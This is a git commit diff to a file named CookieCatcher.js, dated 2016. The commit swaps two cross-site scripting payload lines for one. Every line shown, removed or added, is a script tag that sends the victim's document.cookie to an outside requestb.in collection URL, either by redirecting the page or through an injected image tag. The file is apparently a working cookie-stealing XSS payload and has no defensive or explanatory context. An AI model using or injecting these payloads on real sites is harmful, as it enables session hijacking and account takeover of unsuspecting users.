aa5a2c79be6648d18c8f09965b95074ec08066c0
YodaSecretApprentice <baillarin.matthieu@hotmail.fr>
2016-04-30 15:24:42 +0100

    Update CookieCatcher.js

--- CookieCatcher.js
+++ CookieCatcher.js
@@ -1,2 +1,1 @@
-<script type="text/javascript">location.href='http://requestb.in/16lshbb1?cookie='+escape(document.cookie);</script>
-<script type="text/javascript">document.write('<IMG SCR=\"http://requestb.in/16lshbb1?cookie='+document.cookie+'\">Hacked</IMG>');</script>
+<script type="text/javascript">window.location='http://requestb.in/16lshbb1?cookie='+escape(document.cookie);</script>
